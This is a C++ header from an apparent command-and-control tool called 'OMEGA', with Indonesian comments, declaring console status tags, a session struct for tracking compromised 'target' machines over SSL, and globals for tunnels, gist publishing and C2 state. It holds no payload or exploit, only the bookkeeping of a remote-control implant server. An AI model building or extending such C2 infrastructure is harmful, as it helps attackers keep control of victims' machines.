#ifndef COMMON_STATE_H
#define COMMON_STATE_H

#include <string>
#include <vector>
#include <mutex>
#include <map>
#include <ctime>
#include <openssl/ssl.h>
#include "common/config.h"

#ifdef _WIN32
#include <windows.h>
#endif

// Tag Status Profesional
#define INFO_TAG    "\033[38;5;33m\033[1m[*]\033[0m "
#define SUCCESS_TAG "\033[38;5;46m\033[1m[+]\033[0m "
#define ERROR_TAG   "\033[38;5;196m\033[1m[-]\033[0m "
#define WARNING_TAG "\033[38;5;226m\033[1m[!]\033[0m "
#define PROMPT_TAG  "\033[38;5;201m OMEGA \033[0m\033[38;5;87m» \033[38;5;244mTerminal \033[38;5;87m» \033[0m"

// Struktur untuk menyimpan identitas Sesi Target
struct AgentSession {
    int id;
    SSL* ssl;
    std::string ip;
    std::string cwd;
    std::string status;  // "Active", "Sleeping", "Dead"
    time_t last_seen;
    bool active;
};

// Global State
extern std::string global_public_url;
extern DWORD global_tunnel_pid;
extern bool global_gist_success;
extern int global_server_port;
extern std::mutex session_mutex;
extern std::map<int, AgentSession> active_sessions;
extern int next_session_id;
extern bool c2_running;
extern bool is_master_process;
extern char self_path[MAX_PATH];

// Helper Header
#include "ui_manager.h"

#endif
